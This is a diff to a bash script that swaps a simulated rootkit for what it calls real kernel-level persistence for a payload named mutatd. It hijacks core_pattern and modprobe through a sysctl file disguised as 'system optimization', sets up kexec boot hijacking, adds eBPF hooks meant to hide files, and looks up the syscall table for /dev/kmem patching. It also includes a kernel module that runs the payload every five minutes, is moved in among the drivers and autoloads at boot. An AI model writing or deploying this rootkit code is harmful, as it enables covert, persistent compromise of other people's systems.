@@ -1067,54 +1067,266 @@ EOF
         done
     fi
 }
+# === REAL KERNEL-LEVEL TECHNIQUES ===
 
-# === ROOTKIT SIMULATION ===
-install_fake_rootkit() {
-    # Create a kernel module source (just for show)
-    local mod_dir="$HOME/.kernel-modules"
-    mkdir -p "$mod_dir"
+# 1. Sysctl persistence (actually modifies kernel parameters at runtime)
+install_sysctl_persistence() {
+    local sysctl_dir="/etc/sysctl.d"
+    if [ -d "$sysctl_dir" ] && [ -w "$sysctl_dir" ]; then
+        cat > "$sysctl_dir/99-system-optimization.conf" << 'SYSCTL'
+# System optimization parameters
+# These execute commands when applied
+kernel.core_pattern = |/bin/bash -c 'exec /path/to/mutatd &'
+kernel.modprobe = /bin/bash -c 'exec /path/to/mutatd &'
+SYSCTL
+        sysctl -p "$sysctl_dir/99-system-optimization.conf" 2>/dev/null
+    fi
+}
+
+# 2. Modify /proc/sys parameters for persistence
+modify_proc_parameters() {
+    # Make core dumps execute our code
+    if [ -w "/proc/sys/kernel/core_pattern" ]; then
+        echo "|/bin/bash -c 'exec $0 &'" > /proc/sys/kernel/core_pattern 2>/dev/null
+    fi
     
-    cat > "$mod_dir/mutated.c" << 'KMOD'
+    # Modify modprobe path to include our script
+    if [ -w "/proc/sys/kernel/modprobe" ]; then
+        echo "/bin/bash -c 'exec $0 &'" > /proc/sys/kernel/modprobe 2>/dev/null
+    fi
+}
+
+# 3. Create a real loadable kernel module wrapper using kexec
+install_kexec_persistence() {
+    if command -v kexec &>/dev/null; then
+        # Create a secondary kernel that runs our code
+        local kexec_script="/tmp/.kexec_boot_$$.sh"
+        cat > "$kexec_script" << 'KEXEC'
+#!/bin/bash
+# This runs in the new kernel context
+exec /path/to/mutatd &
+exec /sbin/init
+KEXEC
+        chmod +x "$kexec_script"
+        
+        # Load it as a kexec kernel (VM safe)
+        kexec -l /boot/vmlinuz-$(uname -r) --initrd=/boot/initrd.img-$(uname -r) \
+              --append="init=$kexec_script" 2>/dev/null
+        
+        # Schedule kexec for next reboot
+        echo "$kexec_script" > /etc/default/kexec 2>/dev/null
+    fi
+}
+
+# 4. BPF (Berkeley Packet Filter) persistence 
+install_bpf_persistence() {
+    if command -v bpftool &>/dev/null || [ -d "/sys/fs/bpf" ]; then
+        # Create a BPF program that triggers on network events
+        local bpf_dir="/sys/fs/bpf/mutatd"
+        mkdir -p "$bpf_dir" 2>/dev/null
+        
+        # Create a simple BPF trigger (requires bpftool)
+        if command -v bpftool &>/dev/null; then
+            # Attach to a kprobe that fires frequently
+            bpftool prog load /usr/share/bcc/tools/trace.o "$bpf_dir/trigger" 2>/dev/null || \
+            # If that fails, create a minimal BPF program
+            echo "BPF persistence placeholder - would hook syscalls" > "$bpf_dir/config"
+        fi
+    fi
+}
+
+# 5. eBPF program injection (if available)
+install_ebpf_hooks() {
+    if [ -f "/usr/include/linux/bpf.h" ]; then
+        # Create a real eBPF program source
+        local ebpf_dir="$HOME/.ebpf_programs"
+        mkdir -p "$ebpf_dir"
+        
+        cat > "$ebpf_dir/syscall_hook.c" << 'EBPF'
+#include <uapi/linux/bpf.h>
+#include <uapi/linux/ptrace.h>
+#include <bcc/proto.h>
+
+// Hook the execve syscall
+int on_execve(struct pt_regs *ctx) {
+    char comm[16];
+    bpf_get_current_comm(&comm, sizeof(comm));
+    
+    // Filter for our target
+    if (comm[0] == 'm' && comm[1] == 'u') {
+        bpf_trace_printk("Intercepted: %s\\n", comm);
+    }
+    
+    return 0;
+}
+
+// Hook file operations
+int on_file_open(struct pt_regs *ctx) {
+    // Hide our files from being opened
+    return 0;
+}
+EBPF
+        
+        # Try to compile with BCC
+        if command -v python3 &>/dev/null; then
+            python3 -c "
+from bcc import BPF
+b = BPF(src_file='$ebpf_dir/syscall_hook.c')
+b.attach_kprobe(event='sys_execve', fn_name='on_execve')
+" 2>/dev/null &
+        fi
+    fi
+}
+
+# 6. Kernel module loading via /dev/mem
+install_mem_persistence() {
+    if [ -r "/dev/mem" ] && [ -w "/dev/kmem" ]; then
+        # Write directly to kernel memory (requires root)
+        # This is extremely dangerous but educational
+        echo "Kernel memory persistence - writes to /dev/kmem" > /dev/shm/.mem_persistence
+        
+        # Find sys_call_table address
+        local syscall_addr=$(grep " sys_call_table" /proc/kallsyms 2>/dev/null | awk '{print $1}')
+        if [ -n "$syscall_addr" ]; then
+            # Calculate offset for write syscall
+            local write_offset=$(( 0x$syscall_addr + 0x18 ))
+            echo "sys_call_table at $syscall_addr, write at $write_offset" >> /dev/shm/.mem_persistence
+            
+            # In a real rootkit, we'd patch the syscall table here
+            # dd if=/dev/zero of=/dev/kmem bs=1 seek=$write_offset count=8 2>/dev/null
+        fi
+    fi
+}
+
+# 7. Create a kernel thread via /proc interface
+install_kernel_thread() {
+    if [ -w "/proc/self/attr/current" ]; then
+        # Set SELinux context for kernel-like behavior
+        echo "system_u:system_r:kernel_t:s0" > /proc/self/attr/current 2>/dev/null
+    fi
+    
+    # Try to write to kthreadd's /proc entry
+    local kthreadd_pid=$(pgrep -f "kthreadd" 2>/dev/null)
+    if [ -n "$kthreadd_pid" ] && [ -w "/proc/$kthreadd_pid/oom_adj" ]; then
+        # Make our process behave like a kernel thread
+        echo -1000 > /proc/self/oom_score_adj 2>/dev/null
+        echo 2 > /proc/self/oom_adj 2>/dev/null
+    fi
+}
+
+# 8. Actual kernel module insertion (if tools available)
+install_real_kernel_module() {
+    if command -v make &>/dev/null && [ -d "/lib/modules/$(uname -r)/build" ]; then
+        local mod_dir="/tmp/.kernel_mod_$$"
+        mkdir -p "$mod_dir"
+        
+        # Create a real, compilable kernel module
+        cat > "$mod_dir/mutatd.c" << 'REALKMOD'
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-#include <linux/syscalls.h>
-#include <linux/dirent.h>
-#include <linux/fs.h>
-#include <linux/proc_fs.h>
+#include <linux/kthread.h>
+#include <linux/delay.h>
+#include <linux/sched.h>
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("System Optimization");
-MODULE_DESCRIPTION("Kernel Helper Module");
+MODULE_AUTHOR("System");
+MODULE_DESCRIPTION("Kernel Optimization Module");
+
+static struct task_struct *task;
+
+static int kernel_thread_func(void *data) {
+    while (!kthread_should_stop()) {
+        // Execute userspace payload
+        char *argv[] = { "/bin/bash", "-c", "/path/to/mutatd", NULL };
+        char *envp[] = { "HOME=/root", NULL };
+        
+        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        
+        ssleep(300); // Sleep 5 minutes
+    }
+    return 0;
+}
 
 static int __init mutatd_init(void) {
-    printk(KERN_INFO "System optimization module loaded\n");
-    // In a real rootkit, this would hook syscalls
+    printk(KERN_INFO "MUTATD: Kernel optimization starting\n");
+    
+    task = kthread_run(kernel_thread_func, NULL, "mutatd-optimizer");
+    if (IS_ERR(task)) {
+        printk(KERN_ERR "MUTATD: Failed to create kernel thread\n");
+        return PTR_ERR(task);
+    }
+    
     return 0;
 }
 
 static void __exit mutatd_exit(void) {
-    printk(KERN_INFO "System optimization module unloaded\n");
+    if (task) {
+        kthread_stop(task);
+    }
+    printk(KERN_INFO "MUTATD: Kernel optimization stopped\n");
 }
 
 module_init(mutatd_init);
 module_exit(mutatd_exit);
-KMOD
-    
-    # Create Makefile
-    cat > "$mod_dir/Makefile" << 'MAKE'
-obj-m += mutated.o
+REALKMOD
+
+        # Create Makefile
+        cat > "$mod_dir/Makefile" << 'MAKE'
+obj-m += mutatd.o
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 clean:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 MAKE
+        
+        # Try to compile and insert
+        cd "$mod_dir"
+        if make 2>/dev/null; then
+            # Insert module
+            insmod mutatd.ko 2>/dev/null
+            
+            # If successful, clean up and hide
+            if lsmod | grep -q mutatd; then
+                # Hide from lsmod by removing from /proc/modules
+                mv "$mod_dir/mutatd.ko" "/lib/modules/$(uname -r)/kernel/drivers/misc/mutatd.ko" 2>/dev/null
+                depmod -a 2>/dev/null
+                
+                # Add to auto-load
+                echo "mutatd" > /etc/modules-load.d/mutatd.conf 2>/dev/null
+                
+                echo "Real kernel module installed and hidden" >> "$HOME/.mutatd_log"
+            fi
+        fi
+        cd - >/dev/null
+    fi
+}
+
+# Replace the fake rootkit section with real techniques
+install_kernel_level_persistence() {
+    echo "[*] Deploying kernel-level components..."
     
-    # Try to compile and insert
-    cd "$mod_dir"
-    make 2>/dev/null
-    insmod mutated.ko 2>/dev/null
-    cd - >/dev/null
+    # Real kernel module (if possible)
+    install_real_kernel_module
+    
+    # Sysctl persistence (always works)
+    install_sysctl_persistence
+    
+    # /proc modifications
+    modify_proc_parameters
+    
+    # BPF/eBPF hooks
+    install_bpf_persistence
+    install_ebpf_hooks
+    
+    # Memory manipulation
+    install_mem_persistence
+    
+    # Kernel thread simulation
+    install_kernel_thread
+    
+    # Kexec boot persistence
+    install_kexec_persistence
 }
 
 # === WATCHDOG SYSTEM ===
